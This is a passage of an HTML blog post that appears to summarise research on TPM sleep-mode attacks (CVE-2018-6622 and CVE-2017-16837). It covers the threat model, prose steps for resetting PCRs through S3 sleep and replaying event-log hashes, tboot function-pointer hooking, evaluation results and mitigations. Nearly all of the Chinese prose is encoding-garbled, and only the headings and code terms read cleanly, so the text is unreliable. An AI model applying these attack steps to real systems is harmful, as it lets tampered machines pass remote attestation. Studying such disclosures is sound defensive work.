src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127105830940.png" alt="image-20241127105830940"></p><p>TPMåœ¨ç³»ç»Ÿè¿›å…¥ç¡çœ æ¨¡å¼ï¼ˆå¦‚S3ã€S4ï¼‰æ—¶ä¿å­˜çŠ¶æ€ï¼Œå”¤é†’åæ¢å¤ã€‚</p><p>æè¿°äº†ç¡çœ å’Œæ¢å¤è¿‡ç¨‹ä¸­æ¶‰åŠçš„æ“ä½œç³»ç»Ÿä¸BIOS/UEFIåˆä½œã€‚</p><h2 id="Assumptions-and-Threat-Model">Assumptions and Threat Model</h2><h3 id="Assumptions-2">Assumptions</h3><p>é¦–å…ˆï¼Œå‡è®¾ç³»ç»Ÿä½¿ç”¨TCGçš„<code>SRTM</code>æ¥æµ‹é‡å›ºä»¶å’Œå¼•å¯¼ç¨‹åº,å¹¶å°†æµ‹é‡ç»“æœå­˜å‚¨åœ¨<code>TPM</code>èŠ¯ç‰‡ä¸­ã€‚</p><p>ç¬¬äºŒï¼Œå‡è®¾ç³»ç»Ÿé‡‡ç”¨TCGçš„<code>DRTM</code>æ¶æ„ã€‚</p><p>æœ€åï¼Œå‡è®¾<code>TPM</code>ä¸­å­˜å‚¨çš„æµ‹é‡å€¼ç”±è¿œç¨‹è¯æ˜è€…éªŒè¯ã€‚</p><h3 id="Threat-Model">Threat Model</h3><p>æ”»å‡»è€…è¢«è®¾å®šä¸ºæ‹¥æœ‰Ring-0æƒé™ï¼Œèƒ½ä¿®æ”¹å¯åŠ¨åŠ è½½å™¨å’Œå†…æ ¸ï¼Œä½†ä¸èƒ½ç‰©ç†æ¥è§¦ç¡¬ä»¶ã€‚</p><h2 id="Vulnerability-Analysis">Vulnerability Analysis</h2><h3 id="Finding-the-Security-Vulnerabilities">Finding the Security Vulnerabilities</h3><p>åˆ©ç”¨<code>TPM</code>å’Œ<code>SRTM</code>/<code>DRTM </code>æŠ€æœ¯å¯åŠ¨ç³»ç»Ÿæ¶‰åŠè®¸å¤šå®ä½“ï¼Œå¦‚å›¾æ˜¾ç¤ºäº†å®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127111513711.png" alt="image-20241127111513711"></p><p>å‘ç°æ¼æ´çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><strong>å®¡æŸ¥è§„èŒƒ</strong>ï¼šå‘ç°åœ¨ç”µæºç®¡ç†æ–¹é¢ï¼ŒTPM 2.0è§„èŒƒç›¸è¾ƒäºTPM 1.2æ›´å®¹æ˜“å¼•å‘çŠ¶æ€é‡ç½®é—®é¢˜ã€‚</li><li><strong>æµ‹è¯•å®ç°</strong>ï¼šåœ¨å¤šç§ç¡¬ä»¶å’Œå›ºä»¶å®ç°ä¸­ï¼Œå‘ç°<code>SRTM</code>å’Œ<code>DRTM</code>å‡å­˜åœ¨ä¸ç¬¦åˆè§„èŒƒæˆ–å®ç°ç¼ºé™·çš„é—®é¢˜ã€‚</li><li><strong>æ¼æ´ç¡®è®¤</strong>ï¼šå®éªŒéªŒè¯äº†è¿™äº›é—®é¢˜æ™®éå­˜åœ¨äºå¤šä¸ªå‚å•†çš„è®¾å¤‡ä¸­ã€‚</li></ol><h3 id="SRTM-Vulnerability-CVE-2018-6622">SRTM Vulnerability: CVE-2018-6622</h3><h4 id="Problem-The-Grey-Area">Problem: The Grey Area</h4><p>ä»‹ç»äº†å½“å¹³å°è¿›å…¥S3æˆ–S4ä¼‘çœ çŠ¶æ€æ—¶ï¼Œåˆ‡æ–­è®¾å¤‡ç”µæºï¼Œæ­¤æ—¶<code>TPM</code>åº”è¯¥å°†å…¶çŠ¶æ€ä¿å­˜åˆ°éæ˜“å¤±æ€§éšæœºå­˜å–å­˜å‚¨å™¨ï¼ˆ<code>NVRAM</code>ï¼‰ä¸­ï¼Œç¨åå†æ¢å¤çŠ¶æ€ã€‚å› æ­¤ï¼Œä¸€äº›å¹³å°å…è®¸è½¯ä»¶é‡ç½®<code>PCR</code>å¹¶ä»»æ„æ‰©å±•æµ‹é‡ã€‚</p><p><code>TPM</code>æœ‰ä¸¤ç§ä¸»è¦ç”µæºçŠ¶æ€ï¼šå·¥ä½œçŠ¶æ€ï¼ˆ<code>D0</code>ï¼‰å’Œä½åŠŸè€—çŠ¶æ€ï¼ˆ<code>D3</code>ï¼‰ã€‚åœ¨è¿›å…¥<code>D3</code>çŠ¶æ€å‰ï¼Œ<code>TPM</code>éœ€è¦ä¿å­˜å½“å‰çŠ¶æ€ï¼Œåœ¨æ¢å¤åˆ°<code>D0</code>çŠ¶æ€æ—¶å®ƒå¯ä»¥æ¢å¤ä¿å­˜çš„çŠ¶æ€ã€‚</p><p>æ ¹æ®TPM 1.2è§„èŒƒï¼Œåœ¨è¿›å…¥S3ç¡çœ çŠ¶æ€æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šé€šçŸ¥TPMä¿å­˜çŠ¶æ€ï¼ˆé€šè¿‡<code>TPM_SaveState()</code>å‘½ä»¤ï¼‰ã€‚åœ¨ä»S3æ¢å¤æ—¶ï¼Œé™æ€ä¿¡ä»»æ ¹ï¼ˆ<code>S-CRTM</code>ï¼‰å†³å®šæ˜¯æ¢å¤å…ˆå‰çš„çŠ¶æ€è¿˜æ˜¯é‡æ–°åˆå§‹åŒ–<code>TPM</code>ã€‚å¦‚æœæ²¡æœ‰ä¿å­˜çš„çŠ¶æ€ï¼ŒTPMè¿›å…¥æ•…éšœæ¨¡å¼ï¼Œç›´åˆ°ç³»ç»Ÿé‡å¯ã€‚</p><p>è€Œåœ¨TPM 2.0è§„èŒƒä¸­ï¼Œå³ä½¿æ²¡æœ‰ä¿å­˜çŠ¶æ€ï¼Œ<code>TPM</code>ä¹Ÿä¼šè¿”å›<code>TPM_RC_VALUE</code>ï¼Œä»å…è®¸é‡æ–°å¯åŠ¨ã€‚æ­¤æ—¶ï¼Œ<code>S-CRTM</code>éœ€è¦é‡ç½®<code>TPM</code>å¹¶æ‰§è¡Œ<code>TPM2_Startup(CLEAR)</code>å‘½ä»¤ï¼Œç„¶åå†äº¤ç»™æ“ä½œç³»ç»Ÿæ§åˆ¶ã€‚</p><p>å½“<code>TPM</code>æ²¡æœ‰ä¿å­˜çŠ¶æ€æ—¶ï¼Œå®ƒçš„çŠ¶æ€å¦‚æœè¢«é‡ç½®çš„è¯ä¼šå¯¼è‡´<code>TPM</code>æ¢å¤åˆ°æ¸…é™¤çŠ¶æ€ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯ä»¥å‘<code>PCR</code>æ‰©å±•ä»»æ„å€¼ã€‚</p><h4 id="Exploit-Scenario">Exploit Scenario</h4><p>å¦‚æœæ”»å‡»è€…æ§åˆ¶äº†ç³»ç»Ÿè½¯ä»¶ï¼ŒåŒ…æ‹¬å¼•å¯¼åŠ è½½ç¨‹åºå’Œå†…æ ¸ï¼Œé¦–å…ˆä»æ­£å¸¸å¯åŠ¨è¿‡ç¨‹ä¸­æå–æœ‰æ•ˆçš„å“ˆå¸Œå€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨RAMä¸­ã€‚ç„¶åï¼Œåœ¨ç³»ç»Ÿè¿›å…¥ä¼‘çœ çŠ¶æ€åï¼Œæ”»å‡»è€…ä½¿ç”¨è¿™äº›å“ˆå¸Œå€¼ä¼ªé€ <code>PCR</code>å€¼ï¼Œä½¿å¾—<code>TPM</code>æ˜¾ç¤ºç³»ç»Ÿä»åœ¨ä½¿ç”¨åŸå§‹è½¯ä»¶å¯åŠ¨å’Œè¿è¡Œï¼Œå°½ç®¡å®é™…ä¸Šç³»ç»Ÿå·²ç»è¢«ç¯¡æ”¹ã€‚å¦‚å›¾ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127141928178.png" alt="image-20241127141928178"></p><h4 id="Implementation-in-Detail">Implementation in Detail</h4><ol><li><strong>æå–æ­£å¸¸çš„å“ˆå¸Œå€¼</strong>ï¼šæ”»å‡»è€…é¦–å…ˆéœ€è¦è·å–æ­£å¸¸çš„å“ˆå¸Œå€¼ï¼Œè¿™äº›å“ˆå¸Œå€¼å¯ä»¥ä»TCGäº‹ä»¶æ—¥å¿—ä¸­æå–ã€‚äº‹ä»¶æ—¥å¿—ä¸­è®°å½•äº†æ¯ä¸ªæ‰©å±•åˆ°PCRçš„å€¼ï¼Œä»¥åŠäº‹ä»¶ç±»å‹å’Œç›¸å…³çš„å“ˆå¸Œå€¼ã€‚</li><li><strong>è·å–äº‹ä»¶æ—¥å¿—</strong>ï¼šé€šè¿‡ä¿®æ”¹ç°æœ‰çš„å¯åŠ¨åŠ è½½å™¨å’Œå†…æ ¸ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡UEFIæ¥å£è°ƒç”¨<code>GetEventLog()</code>æ¥æå–äº‹ä»¶æ—¥å¿—ï¼Œå¹¶å°†æ—¥å¿—ä¼ é€’ç»™å†…æ ¸ã€‚æ—¥å¿—æ•°æ®å­˜å‚¨åœ¨ç‰¹å®šçš„å†…å­˜åŒºåŸŸï¼ˆ64KBå†…å­˜å—ï¼‰ï¼Œå¹¶åœ¨å¯åŠ¨åä»ç„¶ä¿ç•™ã€‚</li><li><strong>é‡ç½®TPMå¹¶é‡æ”¾å“ˆå¸Œ</strong>ï¼šæ”»å‡»è€…é€šè¿‡è®©ç³»ç»Ÿè¿›å…¥S3ç¡çœ çŠ¶æ€æ¥é‡ç½®<code>TPM</code>ï¼Œå¹¶åˆ©ç”¨æå–çš„æ­£å¸¸å“ˆå¸Œå€¼ä¾æ¬¡æ‰©å±•åˆ°<code>PCR</code>ï¼Œä¼ªé€ ä¸€ä¸ªæ­£å¸¸çš„å¯åŠ¨åºåˆ—ã€‚è¯¥è¿‡ç¨‹é€šè¿‡å†…æ ¸ä¸­çš„<code>tpm_pcr_extend()</code>å‡½æ•°å®ç°ã€‚</li><li><strong>ä¿®æ”¹å¯åŠ¨åŠ è½½å™¨å’Œå†…æ ¸</strong>ï¼šæ”»å‡»è€…å®šåˆ¶äº†å¯åŠ¨åŠ è½½å™¨å’Œå†…æ ¸ï¼Œä½¿å…¶èƒ½å¤Ÿæå–äº‹ä»¶æ—¥å¿—å¹¶ä¼ªé€ PCRå€¼ã€‚ç‰¹åˆ«æ˜¯ï¼Œå¯åŠ¨åŠ è½½å™¨çš„å“ˆå¸Œå€¼å’Œå†…æ ¸ï¼ˆåŒ…æ‹¬å†…æ ¸æ–‡ä»¶å’Œåˆå§‹åŒ–RAMç£ç›˜æ–‡ä»¶ï¼‰çš„å“ˆå¸Œå€¼é€šè¿‡ç‰¹å®šçš„äº‹ä»¶ç±»å‹ï¼ˆå¦‚EV_EFI BOOT_SERVICES_APPLICATIONå’ŒEV_IPLï¼‰æ¥è¯†åˆ«ã€‚</li><li><strong>TPMé‡ç½®è¿‡ç¨‹</strong>ï¼šè¦é‡ç½®TPMï¼Œæ”»å‡»è€…éœ€è¦ä¿®æ”¹å†…æ ¸ï¼Œä½¿å…¶è·³è¿‡ä¿å­˜TPMçŠ¶æ€çš„æ­¥éª¤ï¼Œå¹¶è°ƒç”¨<code>TPM_Startup(CLEAR)</code>å‘½ä»¤ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…è¿˜éœ€è¦é€šè¿‡ç³»ç»Ÿçš„ä¼‘çœ å‘½ä»¤ä½¿ç³»ç»Ÿè¿›å…¥ç¡çœ çŠ¶æ€ï¼Œç„¶åå†å”¤é†’ç³»ç»Ÿä»¥é‡æ”¾æ­£å¸¸çš„å“ˆå¸Œå€¼ã€‚</li></ol><h3 id="DRTM-Vulnerability-CVE-2017-16837">DRTM Vulnerability: CVE-2017-16837</h3><h4 id="Problem-Lost-Pointer">Problem: Lost Pointer</h4><p><code>DRTM</code>ä¾èµ–åŠ¨æ€å¹³å°é…ç½®å¯„å­˜å™¨ï¼ˆPCRs17-22ï¼‰å­˜å‚¨æµ‹é‡å€¼ï¼Œé€šè¿‡ç¡¬ä»¶å—ä¿¡ä¿æŠ¤çš„åŠ¨æ€å¯åŠ¨äº‹ä»¶ï¼ˆDynamic Launch Event, <code>DLE</code>ï¼‰åˆå§‹åŒ–ï¼Œæ­£å¸¸æƒ…å†µä¸‹åªæœ‰ç¡¬ä»¶å¯è®¿é—®ã€‚</p><p>ä½†åœ¨ä»S3/S4ç¡çœ çŠ¶æ€æ¢å¤æ—¶ï¼Œ<code>DRTM</code>ä¹Ÿä¼šé‡æ–°åˆå§‹åŒ–ï¼Œå­˜åœ¨ç¯¡æ”¹çš„æœºä¼šã€‚æ›´ä¸¥é‡çš„æ˜¯ï¼Œ<code>tboot</code>ï¼ˆIntel TXT çš„å¼€æºå®ç°ï¼‰ä¸­çš„éƒ¨åˆ†å¯å˜çš„å‡½æ•°æŒ‡é’ˆæœªè¢«æµ‹é‡ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›æŒ‡é’ˆæ¥æ§åˆ¶æµ‹é‡æµç¨‹ã€‚</p><h4 id="Exploit-Scenario-2">Exploit Scenario</h4><p>ä¸ºäº†ç ´ååŠ¨æ€ä¿¡ä»»æ ¹ï¼ˆ<code>DRTM</code>ï¼‰çš„å®‰å…¨æ€§ï¼Œæ”»å‡»è€…éœ€è¦ä¼ªé€ æ‰©å±•åˆ°åŠ¨æ€<code>PCR</code>çš„æµ‹é‡å€¼ã€‚è™½ç„¶<code>DCE</code>ï¼ˆåŠ¨æ€é…ç½®ç¯å¢ƒï¼‰åœ¨å¯åŠ¨<code>DLME</code>ï¼ˆåŠ¨æ€åŠ è½½æµ‹é‡ç¯å¢ƒï¼‰ä¹‹å‰ä¼šå…ˆæµ‹é‡å¹¶æ‰©å±•<code>DLME</code>çš„å€¼ï¼Œè¿™ä½¿å¾—ä¼ªé€ æµ‹é‡å€¼å˜å¾—å›°éš¾ï¼Œä½†å¦‚æœ<code>DLME</code>æœ¬èº«å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥ç ´ååŠ¨æ€ä¿¡ä»»é“¾ã€‚</p><p>æ”»å‡»æµç¨‹ä¸<code>SRTM</code>çš„æ”»å‡»ç±»ä¼¼ï¼ŒåŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>æ”»å‡»è€…ä»æ­£å¸¸å¯åŠ¨è¿‡ç¨‹ä¸­ç”Ÿæˆçš„äº‹ä»¶æ—¥å¿—ä¸­æå–åˆæ³•çš„å“ˆå¸Œå€¼ã€‚</li><li>é€šè¿‡è§¦å‘ç³»ç»Ÿè¿›å…¥ç¡çœ çŠ¶æ€ï¼Œé‡ç½®åŠ¨æ€<code>PCR</code>çš„çŠ¶æ€ã€‚</li><li>æ¢å¤æ—¶ï¼Œæ”»å‡»è€…é€šè¿‡é’©ä½ <code>DCE</code>å’Œ <code>DLME</code>ä¸­çš„å‡½æ•°ï¼Œå°†æå–çš„åˆæ³•å“ˆå¸Œå€¼é‡æ–°æ‰©å±•åˆ°åŠ¨æ€ PCRã€‚</li></ol><p>æ”»å‡»çš„æœ€ç»ˆæ•ˆæœä¸<code>SRTM</code>æ”»å‡»ä¸€è‡´ï¼šä¼ªé€ åŠ¨æ€<code>PCR</code>çš„æµ‹é‡å€¼ï¼Œä½¿å…¶æ˜¾ç¤ºç³»ç»Ÿå¤„äºå¯ä¿¡çŠ¶æ€ï¼ŒåŒæ—¶éšè—ç³»ç»Ÿå·²ç»è¢«ç¯¡æ”¹çš„äº‹å®ã€‚</p><h4 id="Implementation-in-Detail-2">Implementation in Detail</h4><ol><li><strong>æå–æ­£å¸¸å¯åŠ¨æµ‹é‡å€¼</strong><br>æ”»å‡»çš„ç¬¬ä¸€æ­¥æ˜¯è·å–æ­£å¸¸å¯åŠ¨æ—¶çš„åŠ¨æ€<code>PCR</code>å€¼ã€‚<code>tboot</code>åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­è®°å½•äº‹ä»¶æ—¥å¿—ï¼Œè¿™äº›æ—¥å¿—åŒ…å«<code>PCR</code>çš„æ‰©å±•é¡ºåºå’Œæµ‹é‡å€¼ï¼ˆå¦‚å¯åŠ¨åŠ è½½å™¨ã€å†…æ ¸æ–‡ä»¶åŠ<code>initrd</code>çš„å“ˆå¸Œï¼‰ã€‚æ”»å‡»è€…é€šè¿‡<code>tboot</code>çš„å·¥å…·ï¼ˆå¦‚<code>txt-stat</code>ï¼‰æå–è¿™äº›æ—¥å¿—ï¼Œæˆ–ç›´æ¥è®¿é—®BIOS/UEFIæš´éœ²çš„å†…å­˜åŒºåŸŸï¼Œå°†è¿™äº›å€¼å­˜å‚¨å¤‡ç”¨ã€‚</li><li><strong>æŒ‚é’©<code>tboot</code>çš„å‡½æ•°æŒ‡é’ˆ</strong><br>åœ¨<code>tboot</code>å®ç°ä¸­ï¼ŒæŸäº›å…¨å±€å˜é‡ï¼ˆå¦‚<code>g_tpm</code>ã€<code>tpm_12_if</code>å’Œ<code>tpm_20_if</code>ï¼‰å­˜å‚¨åœ¨æ•°æ®æ®µå’Œæœªåˆå§‹åŒ–æ•°æ®æ®µï¼ˆ.bssï¼‰ï¼Œè¿™äº›åŒºåŸŸæœªè¢«SINIT ACMæµ‹é‡ã€‚æ”»å‡»è€…é€šè¿‡ç¯¡æ”¹è¿™äº›å˜é‡ï¼Œå°†å…¶æŒ‡å‘è‡ªå®šä¹‰çš„æŒ‚é’©å‡½æ•°ã€‚æŒ‚é’©åçš„å‡½æ•°æ¥ç®¡æµ‹é‡é€»è¾‘ï¼Œè´Ÿè´£ä¼ªé€ åŠ¨æ€<code>PCR</code>çš„æ‰©å±•å€¼ã€‚</li><li><strong>é‡ç½®åŠ¨æ€PCRå¹¶æ³¨å…¥ä¼ªé€ å€¼</strong><br>å½“ç³»ç»Ÿè¿›å…¥S3æˆ–S4ç¡çœ çŠ¶æ€æ—¶ï¼Œ<code>TPM</code>ä¼šè¢«ç½®äºä½åŠŸè€—æ¨¡å¼ï¼Œ<code>åŠ¨æ€PCR</code>æ¸…ç©ºã€‚å”¤é†’åï¼ŒSINIT ACMé‡æ–°å¯åŠ¨æµ‹é‡æµç¨‹å¹¶æ‰©å±•æ–°çš„<code>PCR</code>å€¼ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…çš„æŒ‚é’©å‡½æ•°æ‹¦æˆªæµ‹é‡æ“ä½œï¼Œå°†æ—¥å¿—ä¸­çš„æ­£å¸¸æµ‹é‡å€¼æŒ‰é¡ºåºæ‰©å±•åˆ°<code>PCR</code>ï¼Œä¼ªé€ ç³»ç»Ÿä¸ºå¯ä¿¡çŠ¶æ€ã€‚</li></ol><p>æ•´ä¸ªæ”»å‡»å®Œæˆåï¼Œ<code>åŠ¨æ€PCR</code>æ˜¾ç¤ºçš„æµ‹é‡å€¼ä¸æ­£å¸¸å¯åŠ¨æ—¶å®Œå…¨ä¸€è‡´ï¼Œéšè—äº†ç³»ç»Ÿè¢«ç¯¡æ”¹çš„äº‹å®ã€‚æ”»å‡»åˆ©ç”¨äº†<code>tboot</code>åœ¨æ•°æ®æ®µçš„æµ‹é‡æ¼æ´ï¼Œä»¥åŠ<code>TPM</code>ç¡çœ æ¨¡å¼ä¸‹<code>åŠ¨æ€PCR</code>çš„é‡ç½®æœºåˆ¶ï¼Œå±•ç¤ºäº†<code>DRTM</code>ä¸­å…³é”®å®ç°çš„å®‰å…¨éšæ‚£ã€‚</p><h3 id="Evaluation">Evaluation</h3><ul><li><p>ä½œè€…æµ‹è¯•äº†å¤šä¸ªåŸºäºIntelå¤„ç†å™¨çš„è®¾å¤‡ï¼ŒåŒ…æ‹¬æ”¯æŒTPM1.2å’ŒTPM2.0çš„è®¾å¤‡ï¼Œé‡‡ç”¨äº†ä¸åŒçš„ç¡¬ä»¶å‚å•†å’ŒBIOSç‰ˆæœ¬ã€‚</p></li><li><p>æµ‹è¯•ç³»ç»Ÿä½¿ç”¨Ubuntu16.04.03æ“ä½œç³»ç»Ÿï¼Œå†…æ ¸ç‰ˆæœ¬ä¸º4.13.0-21-genericï¼Œå¹¶å¯¹<code>GRUB</code>ï¼ˆç”¨äºSRTMæ”»å‡»ï¼‰å’Œ<code>tboot</code>ï¼ˆç”¨äºDRTMæ”»å‡»ï¼‰è¿›è¡Œäº†å®šåˆ¶ä¿®æ”¹ã€‚</p></li></ul><h4 id="SRTM-Attack-Grey-Area-Vulnerability">SRTM Attack: Grey Area Vulnerability</h4><ul><li>åœ¨SRTMæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡é‡ç½®TPMå¹¶é‡æ”¾äº‹ä»¶æ—¥å¿—ä¸­çš„æ­£å¸¸æµ‹é‡å€¼ï¼ŒæˆåŠŸä¼ªé€ äº†TPMçš„PCRå€¼ã€‚æµ‹è¯•ä¸­æ‰€æœ‰æ”¯æŒTPM 2.0çš„è®¾å¤‡éƒ½èƒ½æˆåŠŸå®æ–½æ”»å‡»ï¼Œè€ŒTPM 1.2è®¾å¤‡åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä¼šè¿›å…¥æ•…éšœæ¨¡å¼ï¼Œé˜²æ­¢æ”»å‡»æˆåŠŸã€‚</li><li>æµ‹è¯•ç»“æœè¡¨æ˜ï¼ŒTPM2.0è®¾å¤‡æ™®éæœªèƒ½å¦¥å–„å¤„ç†çŠ¶æ€ä¿å­˜å’Œæ¢å¤ï¼Œå¯¼è‡´æ”»å‡»èƒ½å¤Ÿé‡ç½®å¹¶ä¼ªé€ PCRã€‚</li></ul><h4 id="DRTM-Attack-Lost-Pointer-Vulnerability">DRTM Attack: Lost Pointer Vulnerability</h4><ul><li>æ‰€æœ‰æ”¯æŒIntel TXTå’Œ<code>tboot</code>çš„è®¾å¤‡éƒ½æš´éœ²åœ¨æ­¤æ¼æ´ä¸‹ï¼ŒåŒ…æ‹¬ä½¿ç”¨TPM2.0å’Œ1.2çš„è®¾å¤‡ã€‚</li><li>é€šè¿‡å¯¹<code>tboot</code>æºç çš„ä¿®æ”¹ï¼Œæ”»å‡»è€…èƒ½å¤ŸæŒ‚é’©å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œä¼ªé€ <code>åŠ¨æ€PCR</code>å€¼ï¼ŒæˆåŠŸå®ç°é‡æ”¾æ”»å‡»ã€‚</li></ul><h2 id="Discussion-and-Solutions">Discussion and Solutions</h2><h3 id="Discussion">Discussion</h3><ol><li><strong>æ”»å‡»åæœçš„ä¸¥é‡æ€§</strong><ul><li>SRTMæ”»å‡»å…è®¸æ”»å‡»è€…ç»•è¿‡é™æ€æµ‹é‡é“¾ï¼Œå°†æ¶æ„ä¿®æ”¹éšè—åœ¨å¯ä¿¡çŠ¶æ€ä¸­ï¼Œä»è€Œæ¬ºéª—è¿œç¨‹éªŒè¯ã€‚</li><li>DRTMæ”»å‡»åˆ©ç”¨<code>tboot</code>æ¼æ´ä¼ªé€ åŠ¨æ€PCRå€¼ï¼Œå¨èƒèŒƒå›´æ›´å¹¿ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿå½±å“è¿è¡Œæ—¶çš„åŠ¨æ€å¯ä¿¡é“¾ï¼Œä½¿æ•´ä¸ªç³»ç»Ÿå¯¹è½¯ä»¶ç¯¡æ”¹ä¸æ•æ„Ÿã€‚</li></ul></li><li><strong>ç°æœ‰å®‰å…¨å‡è®¾çš„ä¸è¶³</strong><ul><li>SRTMå‡è®¾TPMçŠ¶æ€ä¸å¯åœ¨ä¸é‡å¯çš„æƒ…å†µä¸‹é‡ç½®ï¼Œä½†å®é™…æ¼æ´è¡¨æ˜è¿™ç§å‡è®¾å­˜åœ¨é—®é¢˜ã€‚</li><li>DRTMå‡è®¾å‡å°‘å—ä¿¡è®¡ç®—åŸºï¼ˆTCBï¼‰çš„è§„æ¨¡å¯ä»¥æå‡å®‰å…¨æ€§ï¼Œä½†<code>tboot</code>çš„æ¼æ´è¡¨æ˜ï¼ŒDRTMå®ç°ä»å¯èƒ½å—é™äºè½¯ä»¶çš„è„†å¼±æ€§ã€‚</li></ul></li></ol><h3 id="Solutions">Solutions</h3><ol><li><p>SRTM</p><p><strong>æ”¹è¿›BIOS/UEFIå›ºä»¶ï¼š</strong></p><ul><li>ç¡®ä¿åœ¨æ²¡æœ‰ä¿å­˜çŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œç¦æ­¢è°ƒç”¨<code>TPM2_Startup(CLEAR)</code>æˆ–é™åˆ¶å…¶æ‰§è¡ŒèŒƒå›´ã€‚</li><li>å½“<code>TPM</code>æ— æ³•æ¢å¤åˆ°æ­£å¸¸çŠ¶æ€æ—¶ï¼Œå›ºä»¶åº”è¯¥è§¦å‘ç³»ç»Ÿé‡å¯æˆ–è¿›å…¥â€œå®‰å…¨æ¨¡å¼â€ï¼ˆfailure modeï¼‰ï¼Œè€Œéå…è®¸<code>PCR</code>é‡æ–°åˆå§‹åŒ–ã€‚</li></ul><p><strong>å¼ºåŒ–è§„èŒƒç»†èŠ‚ï¼š</strong></p><ul><li>TPM2.0è§„èŒƒéœ€è¦æ˜ç¡®è§„å®šå½“çŠ¶æ€æ¢å¤å¤±è´¥æ—¶åº”é‡‡å–çš„å…·ä½“æªæ–½ï¼Œè€Œä¸ä»…ä»…ä¾èµ–<code>CRTM</code>çš„â€œçº æ­£æªæ–½â€ã€‚</li><li>å¢å¼ºå¯¹å¼‚å¸¸æƒ…å†µä¸‹çŠ¶æ€å¤„ç†çš„è§„èŒƒåŒ–è¦æ±‚ï¼Œä»è€Œå‡å°‘å‚å•†å®ç°ä¸­æ½œåœ¨çš„ä¸ä¸€è‡´æ€§ã€‚</li></ul></li><li><p>é’ˆå¯¹DRTMæ¼æ´çš„è§£å†³æ–¹æ¡ˆ</p><p><strong>ä¿®å¤<code>tboot</code>å®ç°ï¼š</strong></p><ul><li>å¯¹<code>tboot</code>ä¸­çš„åŠ¨æ€æµ‹é‡é€»è¾‘è¿›è¡Œå…¨é¢å®¡æ ¸ï¼Œç¡®ä¿æ‰€æœ‰æ¶‰åŠçš„å…³é”®æ•°æ®ç»“æ„ï¼ˆå¦‚å‡½æ•°æŒ‡é’ˆï¼‰éƒ½å—åˆ°æµ‹é‡ä¿æŠ¤ã€‚</li><li>å°†åŠ¨æ€æµ‹é‡é€»è¾‘ä¸­ä½¿ç”¨çš„å…¨å±€å˜é‡ç§»å‡ºæœªåˆå§‹åŒ–æ•°æ®æ®µæˆ–å¯å†™æ•°æ®æ®µï¼Œæ”¾å…¥åªè¯»å†…å­˜åŒºåŸŸæˆ–æµ‹é‡èŒƒå›´å†…ã€‚</li></ul><p><strong>ä½¿ç”¨å®‰å…¨çš„ç¼–ç¨‹å®è·µï¼š</strong></p><ul><li>å¼•å…¥ä¸å¯å˜å‡½æ•°æŒ‡é’ˆæˆ–é€šè¿‡ç¡¬ä»¶æ–¹å¼é”å®šå…³é”®æ•°æ®ç»“æ„ï¼Œé˜²æ­¢å…¶è¢«æŒ‚é’©ã€‚</li><li>å¢åŠ å¯¹æ•æ„Ÿå†…å­˜åŒºåŸŸçš„ä¿æŠ¤æªæ–½ï¼Œé˜²æ­¢æ”»å‡»è€…æ³¨å…¥æ¶æ„ä»£ç ã€‚</li></ul></li><li><p>é’ˆå¯¹äº‹ä»¶æ—¥å¿—é‡æ”¾çš„å¯¹ç­–</p><p><strong>ä¿æŠ¤äº‹ä»¶æ—¥å¿—ï¼š</strong></p><ul><li>BIOS/UEFIåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ç”Ÿæˆçš„äº‹ä»¶æ—¥å¿—å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨é‡æ”¾æ­£å¸¸æµ‹é‡å€¼ï¼Œå› æ­¤åº”åœ¨æ“ä½œç³»ç»Ÿæ¥ç®¡ä¹‹å‰å¯¹äº‹ä»¶æ—¥å¿—è¿›è¡ŒåŠ å¯†æˆ–æ“¦é™¤ã€‚</li><li>TPMè§„èŒƒåº”åŠ å…¥é’ˆå¯¹äº‹ä»¶æ—¥å¿—é‡æ”¾çš„é˜²å¾¡æœºåˆ¶ï¼Œä¾‹å¦‚ç¦æ­¢æ—¥å¿—ä¸­æ•æ„Ÿæ•°æ®çš„é‡å¤ä½¿ç”¨ã€‚</li></ul><p><strong>å¢å¼ºè¿œç¨‹éªŒè¯æœºåˆ¶ï¼š</strong></p><ul><li>åœ¨è¿œç¨‹éªŒè¯ä¸­å¢åŠ å¯¹ç³»ç»Ÿå”¤é†’äº‹ä»¶çš„ç›‘æ§ï¼Œé€šè¿‡å®¡è®¡ç¡çœ å’Œå”¤é†’çš„å†å²è®°å½•ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨é‡ç½®å’Œä¼ªé€ çš„è¡Œä¸ºã€‚</li></ul></li><li><p>é•¿æœŸæ–¹å‘ï¼šæ”¹è¿›å¯ä¿¡è®¡ç®—åŸºç¡€æ¶æ„</p><p>ä½œè€…æŒ‡å‡ºï¼Œè™½ç„¶DRTMé€šè¿‡å‡å°‘TCBè§„æ¨¡æå‡äº†å®‰å…¨æ€§ï¼Œä½†å½“å‰çš„å®ç°è¡¨æ˜ï¼Œè½¯ä»¶æ¼æ´ä»ç„¶å¯èƒ½ç ´åä¿¡ä»»é“¾ã€‚æœªæ¥çš„å¯ä¿¡è®¡ç®—æ¶æ„åº”æ›´åŠ æ³¨é‡ç¡¬ä»¶ä¸è½¯ä»¶çš„ååŒé˜²å¾¡ï¼š</p><ul><li>å¼€å‘æ›´å¼ºçš„ç¡¬ä»¶ä¿¡ä»»æ 